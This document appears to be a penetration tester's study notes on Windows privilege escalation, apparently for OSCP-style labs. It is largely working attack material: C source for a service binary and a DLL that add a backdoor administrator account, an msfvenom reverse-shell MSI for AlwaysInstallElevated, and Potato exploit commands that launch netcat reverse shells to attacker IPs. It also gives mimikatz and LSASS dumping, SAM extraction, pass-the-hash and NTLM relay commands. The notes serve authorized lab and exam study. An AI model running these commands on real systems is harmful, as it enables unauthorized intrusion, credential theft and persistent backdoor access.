<h3 id="enumerating-windows">Enumerating Windows</h3>
<p><strong>Windows Privilege and Access Control</strong></p>
<ul>
<li>Secure Identifier (SID)<ul>
<li>Value assigned to each entity</li>
<li>Generated by Local Security Authority for local users and on the DC for domain users</li>
<li>SID looks like this: <code>S-R-X-Y</code> <ul>
<li>S indicates an SID</li>
<li>R is for revision and is always 1</li>
<li>X determines the identity authority (who gave authority) - 5 is <em>NT Authority</em></li>
<li>Y is a bunch of number strings indicating the sub authorities of the entity<ul>
<li>Example: S-1-5-21-1336799502-1441772794-948155058-1001<ul>
<li>RID is 1001, indicating second local user created</li>
</ul>
</li>
</ul>
</li>
<li>S-1-0-0 = Nobody, S-1-1-0 = Everybody, S-1-5-11 = Authenticated Users,  S-1-5-18 = Local system, S-1-5-{domainidentifier}-500 = Administrator</li>
</ul>
</li>
</ul>
</li>
<li>Once a user authenticates, they are granted an access token containing the security context</li>
<li>Security context<ul>
<li>Contains the SID, SIDs of the user&#39;s groups, user and group privileges, and scope info</li>
</ul>
</li>
<li>Integrity Control<ul>
<li>There are four integrity levels<ul>
<li>System: SYSTEM (kernel) </li>
<li>High: Elevated users </li>
<li>Medium: Standard users </li>
<li>Low: very restricted rights</li>
</ul>
</li>
</ul>
</li>
<li>User Account Control (UAC)<ul>
<li>Windows runs most applications with user privileges (even as Administrator)</li>
<li>Running programs as Administrator requires a UAC prompt</li>
</ul>
</li>
</ul>
<p><strong>Collecting Environment Data</strong></p>
<ul>
<li>Generally try to collect:<ul>
<li>Username/hostname - <code>whoami</code></li>
<li>Group memberships of user - <code>Get-LocalGroup</code></li>
<li>Existing users/groups - <code>Get-LocalGroupMember {group name}</code></li>
<li>OS version and arch - <code>systeminfo</code></li>
<li>Network Information - <code>ipconfig /all</code>, <code>route print</code>, <code>netstat -ano or -q</code></li>
<li>Installed Applications - <code>Get-ItemProperty &quot;HKLM:\SOFTWARE\Wow6432Node{can_be_removed}\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select displayname</code> - displays all removable applications <ul>
<li>Can remove <code>select displayname</code> to return all info, like file path</li>
</ul>
</li>
<li>Running Processes - <code>Get-Process</code><ul>
<li><code>Get-Process | Select ProcessName,Path</code></li>
</ul>
</li>
<li>Environment Variables!!<ul>
<li><code>Get-ChildItem Env:</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>Searching for Sensitive Information</strong></p>
<ul>
<li>Check common folders for passwords - it&#39;s pretty common (can use functions below)<ul>
<li>Check hidden directories/files with <code>{dir/ls} -force</code></li>
</ul>
</li>
<li>Example: search XAMPP for config files (could also do keepass databases or the like):<ul>
<li><code>Get-ChildItem -Path C:\Users -Include *.txt, *.ini, -File -Recurse -ErrorAction SilentlyContinue -force</code></li>
</ul>
</li>
<li>Search contents of files<ul>
<li><code>findstr /si {password/pass/pwd/cred/vnc} *.{txt/ini/xml/config}</code></li>
</ul>
</li>
<li>Using sensitive information<ul>
<li>Runas - can run commands as a privileged user - this is basically sudo<ul>
<li><code>runas /user:{username} {program, like powershell.exe}</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>Find sensitive PowerShell information</strong></p>
<ul>
<li>Looking for <em>PowerShell Transcription</em> and <em>PowerShell Script Block Logging</em><ul>
<li>First basically logs every powershell command entered in plaintext, the second records commands and blocks of script code while executing</li>
<li>This would be pretty fucking awesome at CCDC as a red teamer, lol</li>
</ul>
</li>
<li><code>(Get-PSReadlineOption).HistorySavePath</code> - ENTIRE PowerShell history</li>
<li>Event Viewer + Script Block Logging<ul>
<li>Go to <code>Applications and Services Logs &gt; Microsoft &gt; Windows &gt; PowerShell &gt; Operational</code> and scroll through logs</li>
</ul>
</li>
<li>Evil-WinRM<ul>
<li>Basically a better shell that provides pass-the-hash, in-memory loading, file upload/download, etc. from kali</li>
<li>Download a file with <code>download {filename}</code></li>
<li>Upload a file with <code>upload {filename}</code></li>
<li><code>evil-winrm -i {IP} -u {username} -p {password} (-H hash}</code></li>
<li>Can also be provided keys<ul>
<li><code>evil-winrm -i {IP} -c certificate.pem -k priv-key.pem -S</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>Automated tools</strong></p>
<ul>
<li>winPEAS lol<ul>
<li><code>winpeas.exe --fileanalysis</code></li>
<li>available at <code>https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe</code></li>
<li>host it, download it, run it</li>
<li>Can miss stuff, and knowing OSCP it will. </li>
</ul>
</li>
<li>PowerUp powershell script<ul>
  <li>Get the file from kali with <code>iwr {kali_IP}:{kali_port} -o PowerUp.ps1</code></li>
  <li>Run <code>powershell -ep bypass</code> first</li>
<li><a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a></li>
</ul>
</li>
<li>Seatbelt<ul>
<li><a href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a></li>
</ul>
</li>
</ul>
<h3 id="leveraging-windows-services">Leveraging Windows Services</h3>
<p><strong>Hijacking Service Binaries</strong></p>
<ul>
<li><code>Get-CimInstance</code>to query services of WMI (Windows Management Instrumentation) class<ul>
<li><code>Get-CimInstance -ClassName win32_service | Select Name,State,Pathname | Where-Object {$_.State -like &#39;Running&#39;}</code></li>
<li>PowerUp.ps1 (<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a>) can also identify these (among others)</li>
</ul>
</li>
<li>Check the permissions of the service binaries with <code>icacls</code> or <code>Get-ACL</code><ul>
<li><code>icacls &quot;{executable path}&quot;</code></li>
<li>F - Full access</li>
<li>M - Modify Access</li>
<li>RX - Read/execute access (this is too low)</li>
<li>R - Read-only access</li>
<li>W - Write only access</li>
</ul>
</li>
<li><p>If a user has full control over a binary with higher permissions (like a MySQL daemon), we can edit the executable and it will be run with higher permissions</p>
<ul>
<li>This can occur due to full permissions being an easy solution for sysadmins</li>
<li>This binary can be as simple as creating an administrative user with <code>system()</code></li>
<li><code>sudo apt install mingw-w64</code></li>
<li><code>x86_64-w64-mingw32-gcc newuser.c -o newuser.exe</code><ul>
<li><code>python3 -m http.server</code></li>
<li><code>iwr -uri http://{kali_IP}:8000/newuser.exe -Outfile newuser.exe</code>
```
#include <stdlib.h>
int main ()
{
int i;</li>
</ul>
</li>
</ul>
<p>i = system (&quot;net user kali Password123! /add&quot;);
i = system (&quot;net localgroup administrators kali /add&quot;);
i = system (&quot;net localgroup &quot;Remote Desktop Users&quot; kali /add&quot;);</p>
<p>return 0;
}
```</p>
</li>
<li>Then, move the normal executable out from it&#39;s usual location, move ours in, and then figure out how to restart the service (so it uses the exe)</li>
<li>Restarting the service<ul>
<li>Could be as simple as <code>net stop {service}</code>, but access will likely be denied</li>
<li>If the service&#39;s <code>StartMode</code> is set to &quot;Auto&quot;, we can reboot the system (if permissions allow)<ul>
<li>shutdown /r /t 0</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>Hijacking Service DLLs</strong></p>
<ul>
<li>Similar to hijacking binaries, can replace DLL with malicious code</li>
<li>Searching for DLLs:<ul>
<li><code>Get-ItemProperty &quot;HKLM:\SOFTWARE\(optional)Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select displayname</code> to find installed software</li>
<li>The versions of this software could be vulnerable to DLL hijacking (search it up)</li>
</ul>
</li>
<li>Can also replace missing DLLs with malicious ones<ul>
<li>This can be useful when we find a binary we can&#39;t modify that loads a missing DLL<ul>
<li>Will likely be looked for in a PATH location (check with <code>$env:path</code>), so we put it there</li>
</ul>
</li>
<li>We can find missing DLLs by copying user executables to our machine and checking them out with Process Monitor</li>
</ul>
</li>
<li>When making the DLL, we can again simply add an administrative user to the system using something like the following inside of <code>case DLL_PROCESS_ATTACH</code>:<ul>
<li><code>int i; i = system(&quot;net user /ADD tempuser&quot;); i = system(&quot;net localgroups administrators /ADD tempuser&quot;); break;</code></li>
<li>MinGW can compile C++ code into DLLs with the <code>--shared</code> flag<ul>
<li><code>x86_64-w64-mingw32-gcc dll.cpp --shared -o dll.dll</code>
```
#include <stdlib.h>
#include <windows.h></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
          i = system (&quot;net user kali kali123! /add&quot;);
          i = system (&quot;net localgroup administrators kali /add&quot;);
          i = system (&quot;net localgroup &quot;Remote Desktop Users&quot; kali /add&quot;);
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}</p>
<pre><code>
**.bat <span class="hljs-built_in">files</span>**
- Just call <span class="hljs-keyword">an</span> executable inside <span class="hljs-keyword">the</span> batch <span class="hljs-built_in">file</span>
</code></pre><p>C:\Users\Public\reverseshell.exe
```</p>
<p><strong>Abusing Unquoted Service Paths</strong></p>
<ul>
<li>This occurs when we can write to a service&#39;s main directory without being able to modify the current files</li>
<li>Can again be found using <code>wmic</code> in cmd: <ul>
<li><code>wmic service get name,pathname | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</code></li>
<li>These will list potentially vulnerable paths</li>
</ul>
</li>
<li>Abusing this:<ul>
<li>Let&#39;s say a service path is in use like &quot;C:\Program Files\Enterprise Agents\Company Files\GammaServ.exe&quot;</li>
<li>Windows will first check for &quot;C:\Program.exe&quot;, then &quot;C:\Program Files\Enterprise.exe&quot;, then &quot;C:\Program Files\Enterprise Agents\Company.exe&quot;, and finally &quot;C:\Program Files\Enterprise Agents\Company Files\GammaServ.exe&quot;<ul>
<li>If we can write to the &quot;C:\Program Files\Enterprise Agents\&quot; directory, we can make an executable called Company.exe, which will be used before the real one</li>
</ul>
</li>
<li>Then, restart the service</li>
</ul>
</li>
</ul>
<h3 id="abusing-other-windows-components">Abusing Other Windows Components</h3>
<p><strong>Using Scheduled Tasks</strong></p>
<ul>
<li>Need to know who runs the scheduled tasks, what triggers are required, and what the tasks do</li>
<li>View scheduled tasks with <code>Get-ScheduledTask</code> or <code>schtasks /query /fo LIST /v</code><ul>
<li>This is a shit ton of info, pipe it into a text file and search through it<ul>
<li>Can search for <code>{workgroup}\</code>, which will return things authored by people like <code>CLIENTWK220\daveadmin</code></li>
</ul>
</li>
<li>Check author of scheduled tasks, tasks to run, and next run time<ul>
<li>Sometimes, privileged authors can put the executables in modifiable locations</li>
<li>Thus, if we replace it, it will be run as a privileged user on next run time</li>
</ul>
</li>
</ul>
</li>
<li>Get startup tasks: <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>
<strong>Registry</strong></li>
<li>WinPEAS will output controllable Registry entries, look for<ul>
<li><code>HKLM\system\currentcontrolset\services\&lt;service&gt; (Interactive [FullControl])</code></li>
</ul>
</li>
<li>Autorun:<ul>
<li><code>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
</ul>
</li>
<li>Can check perms with <code>accesschk \accepteula -uvwqk &quot;{path}&quot;</code><ul>
<li><a href="https://download.sysinternals.com/files/AccessChk.zip">https://download.sysinternals.com/files/AccessChk.zip</a></li>
</ul>
</li>
<li><code>reg query {registry_path}</code></li>
<li><code>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v {file_path_entry} /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f</code></li>
<li>AlwaysInstallElevated<ul>
<li><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></li>
<li><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></li>
<li>If one of these works, do<ul>
<li><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={port} --platform windows -f msi &gt; reverse.msi</code></li>
<li><code>msiexec /quiet /qn /i reverse.msi</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>Abusing Privileges to Execute Code as Privileged Users</strong></p>
<ul>
<li>Can either exploit applications, the kernel, or abuse privileges we have</li>
<li><code>whoami /priv</code></li>
<li>Privilege Abuse:<ul>
<li>If we have <code>SeImpersonatePrivilege</code>, <code>SeBackupPrivilege</code>, <code>SeAssignPrimaryToken</code>, <code>SeLoadDriver</code>, <code>SeTakeOwnershipPrivilege</code> or <code>SeDebugPrivilege</code>, we can sometimes perform operations in the security context of another user<ul>
<li>With the <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>, we can read arbitrary files with robocopy: <code>robocopy /b C:\&lt;path to file&gt; .\&lt;filename&gt;</code><ul>
<li>We can also just privesc via the following:</li>
<li><code>reg save hklm\sam C:\Users\{current_user}\sam</code></li>
<li><code>reg save hklm\system C:\Users\{current_user}\system</code><ul>
<li>The SAM and SYSTEM will usually be located here:<ul>
<li>C:\Windows\repair\SAM</li>
<li>C:\Windows\System32\config\RegBack\SAM</li>
<li>C:\Windows\System32\config\SAM</li>
<li>Can search with <code>dir /s {SAM/SYSTEM}</code></li>
</ul>
</li>
</ul>
</li>
<li><code>impacket-secretsdump -sam sam -system system LOCAL</code></li>
</ul>
</li>
<li>Use <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/SharpUp.exe">SharpUp</a> to determine which privileges are abusable</li>
<li>With <code>SeDebugPrivilege</code><ul>
<li><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></li>
<li>Then, run <code>mimikatz</code> (run log so output is in txt) and run <code>sekurlsa::minidump lsass.dmp</code></li>
</ul>
</li>
<li>With <code>SeTakeOwnershipPrivilege</code><ul>
<li>Outlined here: <a href="https://academy.hackthebox.com/module/67/section/642">https://academy.hackthebox.com/module/67/section/642</a></li>
</ul>
</li>
</ul>
</li>
<li>Named pipes:<ul>
<li>Allow unrelated processes to share data between each other</li>
<li>If we can coerce a a privileged process into connecting to a controlled named pipe, we can capture the authentication and use <code>SeImpersonatePrivilege</code> to impersonate the user account and perform operations in their security context</li>
<li><em>Sigma Potato (PrintSpoofer)</em><ul>
<li>Coerces NT AUTHORITY/SYSTEM into a named pipe</li>
<li>Must be downloaded somehow</li>
<li>Can be used when we have a user with <code>SeImpersonatePrivilege</code></li>
<li><code>wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe</code></li>
<li><code>.\PrintSpoofer64.exe -i -c powershell.exe</code></li>
</ul>
</li>
</ul>
</li>
<li>General Potato information:<ul>
<li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">https://jlajara.gitlab.io/Potatoes_Windows_Privesc</a></li>
</ul>
</li>
<li>SweetPotato<ul>
<li><a href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a><ul>
<li>Precompiled: <a href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a></li>
</ul>
</li>
<li>Get netcat as well (`/usr/share/windows-resources/binaries/)</li>
<li><code>.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a &quot;10.10.10.10 1234 -e cmd&quot;</code> works pretty well</li>
</ul>
</li>
<li>JuicyPotato<ul>
<li><a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</a></li>
<li><code>C:\Users\Public\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd.exe -a &quot;/c C:\Users\Public\nc.exe 10.10.14.235 4444 -e cmd.exe&quot; -t *</code></li>
</ul>
</li>
<li>GodPotato<ul>
<li>Can use for a reverse shell <code>GodPotato.exe -cmd &quot;cmd /c reverse.exe&quot;</code><ul>
<li><code>GodPotato.exe -cmd &quot;powershell -e ....&quot;</code></li>
</ul>
</li>
<li>Can also use it to create a new administrative user, then rdp/winrm in</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="what-to-do-after-escalating-privileges-">What to do after escalating privileges?</h3>
<ul>
<li>Credentials Credentials Credentials<ul>
<li>Run WinPEAS again</li>
<li><code>Get-ChildItem -Recurse -Filter *.kdbx</code></li>
</ul>
</li>
<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> can extract password hashes from memory as a basic user<ul>
<li>Prebuilt version <a href="https://github.com/gentilkiwi/mimikatz/releases">here</a></li>
<li>Can dump plaintext passwords straight as an Administrator</li>
<li>Run with <code>.\mimikatz.exe</code></li>
<li><code>privilege::debug</code> gives us the <code>SeDebugPrivilege</code> to run below commands</li>
<li><code>token::elevate</code> to elevate to SYSTEM user</li>
<li><code>lsadump::sam</code> will dump NTLM hashes of local users</li>
<li><code>sekurlsa::logonpasswords</code> will look for clear-text passwords, dump NTLM hashes (including domain users), and dump Kerberos tickets</li>
<li>One-liner: <code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::msv&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</code></li>
</ul>
</li>
<li>Crack NTLM<ul>
<li><code>hashcat -m 1000 {hash} {password_list} -r {mutations} --force</code></li>
</ul>
</li>
<li><strong>Passing NTLM</strong><ul>
<li>Don&#39;t necessarily need to crack the NTLM hash to use it<ul>
<li>NTLM hashes aren&#39;t salted between sessions and remain static</li>
</ul>
</li>
<li>Many tools available:<ul>
<li>SMB enumeration: <code>smbclient</code> and <code>crackmapexec</code></li>
<li>Command execution: <code>impacket</code> -&gt; <code>psexec.py\/wmiexec.py</code></li>
<li><code>Mimikatz</code> can also pass-the-hash</li>
</ul>
</li>
<li>Example - accessing SMB share with <code>smbclient</code><ul>
<li><code>smbclient \\\\{IP}\\{SMB_share_endpoint} -U Administrator --pw-nt-hash {hash_from_Mimikatz}</code></li>
</ul>
</li>
<li>Example2 - getting a shell as an Administrator with <code>psexec.py</code><ul>
<li>Searches for a writeable share and uploads an exe to it, registers exe as a Windows service and starts it</li>
<li><code>impacket-psexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}</code> and</li>
<li><code>impacket-wmiexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}</code></li>
</ul>
</li>
</ul>
</li>
<li>Cracking Net-NTLMv2<ul>
<li>Useful when we are an unprivileged user</li>
<li>We have the target start authentication against a machine we own, and capture the hash used during the authentication process</li>
<li><em>Responder</em> is a good tool for capturing Net-NTLMv2 hashes<ul>
<li>Sets up an SMB server that handles auth process and prints hashes</li>
<li><code>sudo responder -I {network interface (like tap0)}</code> to run responder on any given network interface</li>
</ul>
</li>
<li>Getting the target server to contact our server is tricky<ul>
<li>With RCE, it&#39;s easy, just run something like <code>dir \\{Our_machine_IP}\share</code> on the machine running the responder server<ul>
<li>Then, crack the hash with hashcat 5600</li>
</ul>
</li>
<li>Without RCE, there are a couple different techniques<ul>
<li>If there&#39;s a file upload on a webserver on the target, we can use a UNC path (<code>\\{our_IP}\share\xyz)</code> and the application may try to reach out for the file<ul>
<li>This might not work if the slashes are the wrong way, so try something like <code>//{IP}/share.php</code> as the filename</li>
</ul>
</li>
<li>I&#39;d assume local file inclusion would have the same result</li>
</ul>
</li>
</ul>
</li>
<li><strong>Relay Attack</strong><ul>
<li>Lets say you&#39;re in a situation where you&#39;re on a local admin account, but it&#39;s an admin on a different machine. Additionally, we can&#39;t crack the hash from the admin. </li>
<li>Instead of printing the hash, forward it along using <em>ntlmrelayx</em></li>
<li><code>sudo impacket-ntlmrelayx --no-http-server -smb2support -t {IP} -c &quot;powershell -enc {base64_command}&quot;</code><ul>
<li>This will set up an SMB relay to the IP with a powershell command to run</li>
<li>Run SMB <code>dir</code> from the machine we own against the <em>ntlmrelayx</em> machine, which will immediately pass the hash received onto the target machine</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
